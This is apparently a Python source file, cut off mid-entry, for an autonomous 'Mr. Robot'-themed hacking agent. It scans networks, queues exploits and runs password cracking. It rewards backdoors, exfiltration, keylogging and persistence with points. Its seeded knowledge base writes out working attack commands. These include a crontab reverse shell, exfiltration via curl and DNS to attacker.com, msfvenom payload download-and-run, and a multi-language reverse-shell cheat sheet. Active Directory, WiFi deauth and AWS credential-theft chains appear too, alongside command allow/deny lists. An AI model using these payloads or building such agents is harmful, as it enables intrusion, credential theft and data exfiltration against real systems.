"""
Tamagotchi Engine — ELIOT Autonomous Agent

Mr. Robot-themed autonomous intelligence agent.
Runs in the background, discovers devices/vulns, prioritizes exploits,
manages cracking sessions (pausing Ollama for GPU), and creates
notifications requiring authorization for machine-access exploits.
"""

import asyncio
import json
import logging
import os
import signal
import subprocess
import time
import uuid
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

from agents.sentient import Network, Device, WiFiAP, Service, DeviceType

logger = logging.getLogger(__name__)


class TamaState(str, Enum):
    IDLE = "idle"
    SCANNING = "scanning"
    MAPPING = "mapping"
    CRACKING = "cracking"
    ANALYZING = "analyzing"
    EXPLOITING = "exploiting"
    ALERT = "alert"
    SLEEPING = "sleeping"


class NotificationType(str, Enum):
    NEW_DEVICE = "new_device"
    VULN_FOUND = "vuln_found"
    EXPLOIT_READY = "exploit_ready"
    CRACK_COMPLETE = "crack_complete"
    ACCESS_GAINED = "access_gained"
    ALERT = "alert"
    INFO = "info"


class AuthStatus(str, Enum):
    PENDING = "pending"
    APPROVED = "approved"
    DENIED = "denied"
    AUTO_APPROVED = "auto_approved"
    EXPIRED = "expired"


@dataclass
class Notification:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    type: NotificationType = NotificationType.INFO
    title: str = ""
    message: str = ""
    target: str = ""
    severity: str = "info"
    needs_auth: bool = False
    auth_status: AuthStatus = AuthStatus.AUTO_APPROVED
    created_at: float = field(default_factory=time.time)
    auth_at: Optional[float] = None
    result: Optional[str] = None
    exploit_cmd: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["type"] = self.type.value
        d["auth_status"] = self.auth_status.value
        return d


@dataclass
class CrackSession:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    tool: str = "john"
    target: str = ""
    hash_file: str = ""
    wordlist: str = "/usr/share/wordlists/rockyou.txt"
    status: str = "pending"
    progress: str = ""
    started_at: Optional[float] = None
    completed_at: Optional[float] = None
    result: Optional[str] = None
    pid: Optional[int] = None
    gpu_mode: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class ExploitTask:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    target: str = ""
    service: str = ""
    exploit_name: str = ""
    command: str = ""
    priority: int = 0  # Higher = more important
    cve: str = ""
    cvss: float = 0.0
    needs_auth: bool = True
    auth_status: AuthStatus = AuthStatus.PENDING
    created_at: float = field(default_factory=time.time)
    executed: bool = False
    result: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["auth_status"] = self.auth_status.value
        return d


class TamagotchiEngine:
    """
    Autonomous intelligence agent.
    Discovers, maps, prioritizes, and (with authorization) exploits.
    Gamified with XP, levels, weighted rewards, and learning from mistakes.
    """

    # Commands that need authorization (machine access / data extraction)
    AUTH_REQUIRED_PATTERNS = [
        "msfconsole", "msfvenom", "meterpreter",
        "hydra", "ncrack",
        "sqlmap --dump", "sqlmap --os-shell", "sqlmap --os-pwn",
        "exploit", "payload", "reverse_tcp",
        "john --show", "hashcat",
        "sshpass", "smbclient -L",
        "mount", "chroot",
        "curl -d", "wget --post",
        "airodump-ng", "aireplay-ng", "aireplay",
        "mdk4", "reaver", "bully", "pixiewps",
    ]

    # Commands that are always safe (no auth needed)
    SAFE_PATTERNS = [
        "nmap", "nikto", "whatweb", "gobuster", "dirb", "dirbuster",
        "enum4linux", "smbclient -N", "snmpwalk",
        "curl", "wget", "httpie",
        "arp", "ip ", "ifconfig", "ss", "netstat",
        "hcitool", "bluetoothctl",
        "nmcli", "iwlist", "iw ",
        "searchsploit",
        "cat ", "ls ", "grep ", "find ", "head ", "tail ",
        "airodump-ng --write", "tshark", "tcpdump",
        "macchanger",
    ]

    # ── Gamification Constants ───────────────────────────────
    XP_WEIGHTS = {
        # ── Recon & Discovery ──
        "scan_complete": 10,
        "device_discovered": 15,
        "service_detected": 20,
        "os_identified": 12,
        "vuln_found": 30,
        "vuln_validated": 45,
        "new_network_mapped": 25,
        "topology_updated": 8,
        "full_port_scan": 15,
        "service_enum_deep": 18,
        "report_generated": 20,
        "knowledge_logged": 8,
        "scan_informed": 5,
        # ── WiFi & Wireless ──
        "wifi_ap_found": 12,
        "bluetooth_found": 10,
        "wifi_traffic_captured": 15,
        "handshake_captured": 80,
        "pmkid_captured": 75,
        "wpa_cracked": 100,
        "wifi_deauth": 35,
        "evil_twin_setup": 60,
        "wps_pin_cracked": 70,
        "wifi_client_isolated": 25,
        # ── Exploitation ──
        "exploit_success": 50,
        "service_exploited": 55,
        "default_creds_found": 60,
        "reverse_shell_obtained": 120,
        "access_gained": 150,
        "auth_granted": 5,
        "ftp_anon_access": 40,
        "smb_null_session": 45,
        "redis_unauthenticated": 50,
        "tomcat_manager_bypass": 65,
        "ssh_default_creds": 55,
        "snmp_community_found": 35,
        "smb_relay_executed": 80,
        "kerberoasted": 90,
        "asrep_roasted": 85,
        "password_sprayed": 40,
        # ── Post-Exploitation ──
        "crack_complete": 40,
        "hash_cracked": 45,
        "credential_harvested": 55,
        "privilege_escalated": 130,
        "lateral_movement": 110,
        "port_forward_established": 45,
        "data_exfiltrated": 100,
        "backdoor_installed": 140,
        "persistence_established": 120,
        "pivot_established": 90,
        "screen_capture": 30,
        "keylog_captured": 50,
        "clipboard_stolen": 25,
        # ── Password Attacks ──
        "hydra_bruteforce": 50,
        "john_crack": 40,
        "hashcat_crack": 45,
        "dictionary_attack": 35,
        "rule_based_crack": 50,
        # ── MITM ──
        "mitm_established": 95,
        "arp_spoofing": 65,
        "dns_spoofing": 70,
        "ssl_stripping": 80,
        "credential_intercepted": 110,
        # ── Penalties ──
        "false_positive": -15,
        "scan_timeout": -5,
        "exploit_failed": -20,
        "wrong_classification": -10,
        "detection_escalated": -30,
        "target_lockout": -25,
        "connection_lost": -10,
    }

    LEVEL_XP = [
        0, 100, 250, 500, 800, 1200, 1800, 2500, 3500, 5000,
        7000, 10000, 14000, 19000, 25000, 32000, 40000, 50000,
        62000, 75000, 90000, 110000, 135000, 165000, 200000,
    ]

    LEVEL_NAMES = [
        "Script Kiddie", "Script Kiddie", "Script Kiddie",
        "Novice Hacker", "Novice Hacker",
        "Junior Pentester", "Junior Pentester",
        "Pentester", "Pentester", "Pentester",
        "Senior Pentester", "Senior Pentester",
        "Security Analyst", "Security Analyst",
        "Red Team Operator", "Red Team Operator",
        "Exploit Developer", "Exploit Developer",
        "Security Researcher", "Security Researcher",
        "Bug Hunter", "Bug Hunter",
        "Elite Hacker", "Elite Hacker", "Elite Hacker",
    ]

    ACHIEVEMENTS = {
        # ── Discovery Milestones ──
        "first_scan": {"name": "First Steps", "desc": "Complete your first scan", "xp": 50, "icon": "🔍"},
        "first_device": {"name": "Network Explorer", "desc": "Discover your first device", "xp": 75, "icon": "📡"},
        "first_vuln": {"name": "Bug Finder", "desc": "Find your first vulnerability", "xp": 100, "icon": "🐛"},
        "ten_devices": {"name": "Network Mapper", "desc": "Discover 10 devices", "xp": 300, "icon": "🗺️"},
        "fifty_devices": {"name": "Network Conqueror", "desc": "Discover 50 devices", "xp": 800, "icon": "🏔️"},
        "ten_vulns": {"name": "Vuln Collector", "desc": "Find 10 vulnerabilities", "xp": 400, "icon": "📋"},
        "fifty_services": {"name": "Service Inspector", "desc": "Identify 50 unique services", "xp": 350, "icon": "🔎"},
        "full_network": {"name": "Network Dominator", "desc": "Map an entire /24 subnet", "xp": 600, "icon": "🌐"},
        "full_port_sweep": {"name": "Port Sweeper", "desc": "Complete a full 65535 port scan", "xp": 250, "icon": "🔌"},
        # ── Exploitation Milestones ──
        "first_exploit": {"name": "Exploit Artist", "desc": "Execute your first exploit", "xp": 200, "icon": "💥"},
        "first_access": {"name": "Break In", "desc": "Gain shell access to a machine", "xp": 300, "icon": "🔓"},
        "five_access": {"name": "Access Collector", "desc": "Gain access to 5 machines", "xp": 800, "icon": "🦾"},
        "ten_access": {"name": "Systemic Breach", "desc": "Gain access to 10 machines", "xp": 1500, "icon": "👑"},
        "default_creds_hunter": {"name": "Cred Sweeper", "desc": "Find default credentials on 3 services", "xp": 250, "icon": "🔑"},
        "first_backdoor": {"name": "Shadow Operator", "desc": "Install your first backdoor", "xp": 350, "icon": "🚪"},
        "five_backdoors": {"name": "Backdoor Architect", "desc": "Install backdoors on 5 machines", "xp": 1000, "icon": "🏗️"},
        "first_mitm": {"name": "Man in the Middle", "desc": "Execute your first MITM attack", "xp": 300, "icon": "🕵️"},
        "first_priv_esc": {"name": "Root Seeker", "desc": "Escalate privileges for the first time", "xp": 400, "icon": "⬆️"},
        "five_priv_esc": {"name": "Privilege Lord", "desc": "Escalate privileges 5 times", "xp": 1200, "icon": "🔱"},
        "first_lateral": {"name": "Pivot King", "desc": "Move laterally between machines", "xp": 350, "icon": "🔄"},
        "first_exfil": {"name": "Data Thief", "desc": "Exfiltrate data from a target", "xp": 400, "icon": "📦"},
        "first_reverse_shell": {"name": "Shell Gained", "desc": "Obtain a reverse shell", "xp": 350, "icon": "🐚"},
        # ── WiFi Milestones ──
        "first_crack": {"name": "Password Hunter", "desc": "Crack your first password/hash", "xp": 150, "icon": "🔐"},
        "first_handshake": {"name": "Handshake Captured", "desc": "Capture your first WPA2 handshake", "xp": 250, "icon": "🤝"},
        "ten_handshakes": {"name": "WiFi Warrior", "desc": "Capture 10 WPA2 handshakes", "xp": 800, "icon": "⚔️"},
        "first_wpa_crack": {"name": "Key Cracker", "desc": "Crack a WPA2 password", "xp": 350, "icon": "🗝️"},
        "first_evil_twin": {"name": "Impersonator", "desc": "Set up your first evil twin", "xp": 300, "icon": "👯"},
        "first_deauth": {"name": "Air Jammer", "desc": "Execute a deauth attack", "xp": 200, "icon": "📡"},
        # ── Credential Attacks ──
        "first_hash_crack": {"name": "Hash Breaker", "desc": "Crack your first hash", "xp": 200, "icon": "#️⃣"},
        "ten_hashes": {"name": "Hash Collector", "desc": "Crack 10 hashes", "xp": 500, "icon": "🧮"},
        "first_kerberoast": {"name": "AD Exploiter", "desc": "Kerberoast an AD account", "xp": 350, "icon": "🎯"},
        "first_hydra": {"name": "Brute Force Pro", "desc": "Crack a password with Hydra", "xp": 200, "icon": "🔨"},
        # ── Persistence & Stealth ──
        "first_persistence": {"name": "Permanent Access", "desc": "Establish persistence on a target", "xp": 300, "icon": "📌"},
        "three_persistence": {"name": "Persistent Hacker", "desc": "Establish persistence on 3 machines", "xp": 800, "icon": "🏛️"},
        "stealth_master": {"name": "Ghost", "desc": "Complete 10 operations undetected", "xp": 300, "icon": "👻"},
        "first_pivot": {"name": "Pivot Master", "desc": "Set up port forwarding/pivoting", "xp": 250, "icon": "🌉"},
        # ── MITM & Intercept ──
        "first_arp_spoof": {"name": "ARP Master", "desc": "Execute ARP spoofing", "xp": 200, "icon": "🃏"},
        "first_ssl_strip": {"name": "HTTPS Downgrader", "desc": "Perform SSL stripping", "xp": 300, "icon": "📉"},
        "first_credential_intercept": {"name": "Credential Sniffer", "desc": "Intercept credentials via MITM", "xp": 400, "icon": "🦯"},
        # ── XP Milestones ──
        "hundred_xp": {"name": "Rising Star", "desc": "Earn 100 XP total", "xp": 50, "icon": "⭐"},
        "thousand_xp": {"name": "Dedicated Hacker", "desc": "Earn 1000 XP total", "xp": 100, "icon": "🌟"},
        "five_thousand_xp": {"name": "XP Grinder", "desc": "Earn 5000 XP total", "xp": 200, "icon": "💫"},
        "ten_thousand_xp": {"name": "Veteran", "desc": "Earn 10000 XP total", "xp": 400, "icon": "🏅"},
        # ── Level Milestones ──
        "level_5": {"name": "Getting Serious", "desc": "Reach level 5", "xp": 200, "icon": "📈"},
        "level_10": {"name": "Pro Pentester", "desc": "Reach level 10", "xp": 500, "icon": "🏆"},
        "level_15": {"name": "Red Teamer", "desc": "Reach level 15", "xp": 750, "icon": "🎖️"},
        "level_20": {"name": "Elite Operator", "desc": "Reach level 20", "xp": 1000, "icon": "🥇"},
        # ── Special ──
        "night_owl": {"name": "Night Owl", "desc": "Run operations between 2-5 AM", "xp": 75, "icon": "🦉"},
        "night_stalker": {"name": "Night Stalker", "desc": "Complete 5 operations between 2-5 AM", "xp": 300, "icon": "🦇"},
        "speed_demon": {"name": "Speed Demon", "desc": "Complete a full cycle in under 60s", "xp": 200, "icon": "⚡"},
        "chain_master": {"name": "Kill Chain", "desc": "Chain recon, exploit, pivot, and escalate", "xp": 1000, "icon": "⛓️"},
        "vuln_chain": {"name": "Vuln Chainer", "desc": "Chain 3+ vulnerabilities together", "xp": 500, "icon": "🔗"},
        "zero_day_hunter": {"name": "Zero Day Hunter", "desc": "Find 10 unique CVEs", "xp": 600, "icon": "🕵️‍♂️"},
        "full_spectrum": {"name": "Full Spectrum", "desc": "Perform recon, exploit, and post-exploit in one cycle", "xp": 500, "icon": "🌈"},
        "machine_whisperer": {"name": "Machine Whisperer", "desc": "Access 3 different OS types", "xp": 450, "icon": "🤖"},
    }

    def __init__(self):
        self._state = TamaState.IDLE
        self._notifications: List[Notification] = []
        self._exploit_queue: List[ExploitTask] = []
        self._crack_sessions: List[CrackSession] = []
        self._knowledge_log: List[Dict[str, Any]] = []
        self._running = False
        self._paused = False
        self._loop_task: Optional[asyncio.Task] = None
        self._scan_task: Optional[asyncio.Task] = None
        self._ollama_pid: Optional[int] = None
        self._ollama_was_running = False
        self._stats = {
            "scans_run": 0,
            "devices_found": 0,
            "vulns_found": 0,
            "vulns_validated": 0,
            "exploits_executed": 0,
            "cracks_run": 0,
            "hashes_cracked": 0,
            "notifications_created": 0,
            "authorizations_granted": 0,
            "handshakes_captured": 0,
            "networks_analyzed": 0,
            "open_networks_found": 0,
            "access_gained": 0,
            "backdoors_installed": 0,
            "credentials_harvested": 0,
            "privilege_escalations": 0,
            "lateral_movements": 0,
            "mitm_attacks": 0,
            "data_exfiltrations": 0,
            "persistence_established": 0,
            "wifi_cracks": 0,
            "wifi_deauths": 0,
            "evil_twins": 0,
            "reverse_shells": 0,
            "kerberoasts": 0,
            "pivot_count": 0,
            "reports_generated": 0,
            "cycle_count": 0,
        }
        # ── Network State (tamagotchi IS the sole engine) ──
        self._devices: Dict[str, Any] = {}
        self._networks: Dict[str, Any] = {}
        self._wifi_aps: Dict[str, Any] = {}
        self._topology: Dict[str, Any] = {"nodes": [], "edges": []}
        self._our_ip: str = ""
        self._our_mac: str = ""
        self._my_interfaces: Dict[str, str] = {}
        self._wifi_interface: str = "wlxc4e984dfb30f"
        self._PRIMARY_WIFI: str = "wlxc4e984dfb30f"
        self._live_events: List[Dict[str, Any]] = []
        self._max_live_events: int = 200
        self._scan_history: List[Dict[str, Any]] = []
        self._last_full_scan: float = 0
        # ── Gamification State ──
        self._xp: int = 0
        self._level: int = 1
        self._total_xp: int = 0
        self._achievements: List[str] = []
        self._event_log: List[Dict[str, Any]] = []
        self._streaks: Dict[str, int] = {
            "scans": 0, "devices": 0, "vulns": 0, "exploits": 0,
            "creds": 0, "wifi": 0, "access": 0, "persistence": 0,
            "mitm": 0, "lateral": 0,
        }
        self._mistakes: List[Dict[str, Any]] = []
        self._current_thought: str = "Initializing..."
        self._thinking_log: List[Dict[str, Any]] = []
        # ── Phase tracking for user's route ──
        self._current_phase: str = "init"
        self._phase_progress: Dict[str, Any] = {}
        self._network_queue: List[Dict[str, Any]] = []
        self._target_queue: List[Dict[str, Any]] = []
        self._reports: List[Dict[str, Any]] = []
        # Persistence
        self._data_dir = Path(os.environ.get("ELIOT_DATA_DIR", "/app/data")) / "tamagotchi"
        self._data_dir.mkdir(parents=True, exist_ok=True)
        self._load_state()
        self._seed_knowledge()

    def _load_state(self):
        """Load persisted state from disk."""
        state_file = self._data_dir / "state.json"
        if not state_file.exists():
            return
        try:
            with open(state_file, 'r') as f:
                data = json.load(f)
            self._xp = data.get("xp", 0)
            self._level = data.get("level", 1)
            self._total_xp = data.get("total_xp", 0)
            self._achievements = data.get("achievements", [])
            self._streaks = data.get("streaks", {"scans": 0, "devices": 0, "vulns": 0, "exploits": 0})
            # Merge new stat keys with defaults (backwards compatible with old saves)
            saved_stats = data.get("stats", {})
            for k, v in self._stats.items():
                if k not in saved_stats:
                    saved_stats[k] = v
            self._stats = saved_stats
            # Merge new streak keys with defaults
            default_streaks = {"scans": 0, "devices": 0, "vulns": 0, "exploits": 0,
                               "creds": 0, "wifi": 0, "access": 0, "persistence": 0,
                               "mitm": 0, "lateral": 0}
            for k, v in default_streaks.items():
                if k not in self._streaks:
                    self._streaks[k] = 0
            logger.info(f"Loaded state: level={self._level}, xp={self._total_xp}, achievements={len(self._achievements)}")
        except Exception as e:
            logger.error(f"Failed to load state: {e}")

        # Load knowledge
        knowledge_file = self._data_dir / "knowledge.json"
        if knowledge_file.exists():
            try:
                with open(knowledge_file, 'r') as f:
                    self._knowledge_log = json.load(f)
                logger.info(f"Loaded {len(self._knowledge_log)} knowledge entries")
            except Exception as e:
                logger.error(f"Failed to load knowledge: {e}")

        # Load event log
        events_file = self._data_dir / "events.json"
        if events_file.exists():
            try:
                with open(events_file, 'r') as f:
                    self._event_log = json.load(f)
                logger.info(f"Loaded {len(self._event_log)} events")
            except Exception as e:
                logger.error(f"Failed to load events: {e}")

        # Load mistakes
        mistakes_file = self._data_dir / "mistakes.json"
        if mistakes_file.exists():
            try:
                with open(mistakes_file, 'r') as f:
                    self._mistakes = json.load(f)
                logger.info(f"Loaded {len(self._mistakes)} mistakes")
            except Exception as e:
                logger.error(f"Failed to load mistakes: {e}")

    def _seed_knowledge(self):
        """Seed knowledge base with 100+ attack patterns, workflows, CVEs, and techniques."""
        if len(self._knowledge_log) > 50:
            logger.info(f"Knowledge already seeded ({len(self._knowledge_log)} entries), skipping")
            return

        seed = []

        # ══════════════════════════════════════════════════════
        # END-TO-END PENTEST WORKFLOWS (15)
        # ══════════════════════════════════════════════════════
        seed.append(("workflow", "full_pentest_e2e", {
            "name": "Full Penetration Test Workflow",
            "phases": [
                "1. Recon: nmap -sV -sC -O -T4 target/24",
                "2. Enum: gobuster dir -u http://target -w wordlist.txt",
                "3. Vuln Scan: nmap --script vuln -T4 target",
                "4. Exploit: msfconsole 'use exploit; set RHOSTS target; exploit'",
                "5. Post-Exploit: meterpreter > hashdump; meterpreter > shell",
                "6. PrivEsc: sudo -l; find / -perm -4000 2>/dev/null",
                "7. Persistence: echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' | crontab -",
                "8. Report: document all findings, CVEs, evidence",
            ],
            "tools": ["nmap", "gobuster", "nikto", "msfconsole", "meterpreter", "john"],
            "estimated_time": "4-8 hours",
            "skill_level": "intermediate",
        }, "mitre"))

        seed.append(("workflow", "wifi_pentest_e2e", {
            "name": "WiFi Penetration Test",
            "phases": [
                "1. Monitor mode: airmon-ng start wlxc4e984dfb30f",
                "2. Discover: airodump-ng wlan0mon",
                "3. Target: airodump-ng --bssid TARGET --channel CH --write cap wlan0mon",
                "4. Deauth: aireplay-ng -0 5 -a TARGET -c CLIENT wlan0mon",
                "5. Capture 4-way handshake",
                "6. Crack: aircrack-ng -w rockyou.txt cap-01.cap",
                "7. If WPA2-Enterprise: hostapd-wpe for credential harvesting",
            ],
            "tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
            "requires_auth": True,
            "estimated_time": "1-4 hours",
        }, "mitre"))

        seed.append(("workflow", "web_app_pentest_e2e", {
            "name": "Web Application Penetration Test",
            "phases": [
                "1. Recon: whatweb target; nikto -h target; dirb target wordlist.txt",
                "2. Spider: gobuster dir -u target -x php,html,txt -w wordlist",
                "3. Enum: wfuzz -c wordlist -z file,users.txt target/FUZZ",
                "4. SQLi: sqlmap -u 'target/?id=1' --dbs --batch",
                "5. XSS: <script>alert(1)</script> in all input fields",
                "6. SSRF: http://target/internal; http://169.254.169.254/latest/meta-data/",
                "7. File Upload: bypass extension filter, upload webshell",
                "8. RCE: command injection via ping, eval, exec functions",
            ],
            "tools": ["nikto", "gobuster", "sqlmap", "wfuzz", "whatweb", "dirb"],
            "estimated_time": "2-6 hours",
        }, "owasp"))

        seed.append(("workflow", "active_directory_attack", {
            "name": "Active Directory Attack Chain",
            "phases": [
                "1. Enum: enum4linux -a domain_controller",
                "2. User Enum: rpcclient -U '' -N domain_controller 'enumdomusers'",
                "3. Kerberoast: GetUserSPNs.py domain/user:pass -request",
                "4. AS-REP Roast: GetNPUsers.py domain/ -usersfile users.txt -format hashcat",
                "5. Pass-the-Hash: psexec.py -hashes aad3b... domain/admin@target",
                "6. DCSync: secretsdump.py domain/admin:pass@dc_ip",
                "7. Golden Ticket: ticketer.py -nthash krbtgt_hash -domain-sid SID domain",
            ],
            "tools": ["enum4linux", "impacket", "bloodhound", "rubeus"],
            "requires_auth": True,
            "estimated_time": "4-12 hours",
        }, "mitre"))

        seed.append(("workflow", "privilege_escalation_linux", {
            "name": "Linux Privilege Escalation",
            "phases": [
                "1. System Info: uname -a; cat /etc/os-release; id; whoami",
                "2. Sudo: sudo -l",
                "3. SUID: find / -perm -4000 2>/dev/null",
                "4. Capabilities: getcap -r / 2>/dev/null",
                "5. Writable Paths: find / -writable -type f 2>/dev/null",
                "6. Cron Jobs: cat /etc/crontab; ls -la /etc/cron*",
                "7. Kernel Exploit: searchsploit linux kernel 4.x",
                "8. Docker Escape: ls -la /var/run/docker.sock",
                "9. Exploit: use matching exploit from searchsploit",
            ],
            "tools": ["linpeas", "linux-exploit-suggester", "searchsploit"],
            "estimated_time": "1-2 hours",
        }, "mitre"))

        seed.append(("workflow", "privilege_escalation_windows", {
            "name": "Windows Privilege Escalation",
            "phases": [
                "1. System Info: systeminfo; hostname; whoami /priv",
                "2. Patch Level: systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
                "3. Services: sc query; wmic service list brief",
                "4. AlwaysInstallElevated: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                "5. Unquoted Service: wmic service get name,displayname,pathname",
                "6. Autorun: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "7. Token Impersonation: Incognito via Metasploit",
                "8. Exploit: Use matching exploit from searchsploit",
            ],
            "tools": ["winpeas", "seatbelt", "metasploit"],
            "requires_auth": True,
            "estimated_time": "1-3 hours",
        }, "mitre"))

        seed.append(("workflow", "lateral_movement", {
            "name": "Lateral Movement Techniques",
            "phases": [
                "1. Pass-the-Hash: psexec.py -hashes :NTLM admin@target",
                "2. Pass-the-Ticket: export KRB5CCNAME=/tmp/ticket.ccache",
                "3. Overpass-the-Hash: psexec.py domain/user:pass@target",
                "4. WMI Execution: wmiexec.py domain/user:pass@target 'cmd /c whoami'",
                "5. WinRM: evil-winrm -i target -u user -p pass",
                "6. SSH Tunneling: ssh -L 8080:internal:80 user@jump_host",
                "7. RDP: xfreerdp /v:target /u:user /p:pass /dynamic-resolution",
            ],
            "tools": ["impacket", "evil-winrm", "xfreerdp", "ssh"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "data_exfiltration", {
            "name": "Data Exfiltration Techniques",
            "phases": [
                "1. File Discovery: find / -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null",
                "2. Credentials: cat /etc/shadow; cat /etc/passwd",
                "3. Database Dump: mysqldump -u root -p --all-databases",
                "4. Archive: tar czf /tmp/data.tar.gz /target/dir",
                "5. DNS Exfil: python3 -c \"import socket; socket.sendto(data, ('attacker.com', 53))\"",
                "6. HTTP Exfil: curl -X POST -d @file http://attacker.com/upload",
                "7. ICMP Exfil: hping3 --data file --icmp target",
                "8. Steganography: steghide embed -cf image.jpg -ef secret.txt",
            ],
            "tools": ["curl", "python3", "steghide", "hping3"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "cobalt_strike_style", {
            "name": "C2/Beacon Setup (Manual)",
            "phases": [
                "1. Generate Payload: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o payload",
                "2. Listener: msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; exploit'",
                "3. Transfer: python3 -m http.server 8080 (on attacker)",
                "4. Execute: wget http://attacker:8080/payload && chmod +x payload && ./payload",
                "5. Pivot: meterpreter > run autoroute -s 10.0.0.0/24",
                "6. Proxy: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4445",
                "7. SOCKS Proxy: socks4a 127.0.0.1 1080",
            ],
            "tools": ["msfvenom", "msfconsole", "meterpreter"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "network_pivoting", {
            "name": "Network Pivoting & Tunneling",
            "phases": [
                "1. SSH Tunnel: ssh -D 1080 user@jump_host (SOCKS proxy)",
                "2. SSH Tunnel: ssh -L 3306:db_server:3306 user@jump_host",
                "3. Chisel: chisel server --reverse; chisel client attacker:8080 R:socks",
                "4. Proxychains: proxychains nmap -sT -Pn internal_host",
                "5. Port Forwarding: socat TCP-LISTEN:8080,fork TCP:internal:80",
                "6. ICMP Tunnel: icmpsh -t target -d attacker_ip",
                "7. DNS Tunnel: dnscat2 attacker.com",
            ],
            "tools": ["ssh", "chisel", "socat", "proxychains", "dnscat2"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "wireless_attack_chain", {
            "name": "Complete Wireless Attack Chain",
            "phases": [
                "1. Monitor Mode: airmon-ng start wlxc4e984dfb30f",
                "2. Recon: airodump-ng wlan0mon --write /tmp/recon",
                "3. Target Selection: Identify WPA2 networks with clients",
                "4. Capture Handshake: airodump-ng --bssid MAC --channel CH -w /tmp/handshake wlan0mon",
                "5. Deauth: aireplay-ng -0 10 -a MAC wlan0mon",
                "6. Crack: aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/handshake-01.cap",
                "7. If WPS: reaver -i wlan0mon -b MAC -vv",
                "8. PMKID: hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --filterlist_ap=MAC",
            ],
            "tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "hcxdumptool"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "api_pentest", {
            "name": "REST API Penetration Test",
            "phases": [
                "1. Enum: curl -s target/api/v1/ | jq",
                "2. Auth Bypass: Remove auth headers, use empty token",
                "3. IDOR: Change ID in /api/users/123 to /api/users/1",
                "4. Injection: POST with {\"username\":\"admin'--\"}",
                "5. XXE: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                "6. Rate Limit: for i in $(seq 1 1000); do curl -s target/login; done",
                "7. JWT: jwt_tool token.txt -C -d /usr/share/wordlists/john.lst",
                "8. SSRF: {\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
            ],
            "tools": ["curl", "jq", "jwt_tool", "burpsuite"],
            "estimated_time": "2-4 hours",
        }, "owasp"))

        seed.append(("workflow", "cloud_pentest_aws", {
            "name": "AWS Cloud Pentest",
            "phases": [
                "1. Enum: aws iam list-users; aws s3 ls",
                "2. Creds: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "3. Privesc: aws iam create-access-key --user-name admin",
                "4. S3 Bucket: aws s3 sync s3://bucket /tmp/exfil",
                "5. Lambda: aws lambda get-function --function-name admin_func",
                "6. Secrets: aws secretsmanager get-secret-value --secret-id prod/db",
                "7. EC2: aws ec2 describe-instances --filters Name=instance-state-name,Values=running",
            ],
            "tools": ["aws-cli", "pacu", "loudcloud"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "reverse_shell_cheatsheet", {
            "name": "Reverse Shell Techniques",
            "shells": {
                "bash": "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
                "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "perl": "perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}'",
                "php": "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f",
                "ncat": "ncat ATTACKER 4444 -e /bin/sh",
                "java": "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"});p.waitFor()",
                "powershell": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            },
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # EXPLOIT PATTERNS (25)
        # ══════════════════════════════════════════════════════
        seed.append(("exploit_pattern", "ssh_bruteforce_hydra", {
            "name": "SSH Brute Force with Hydra",
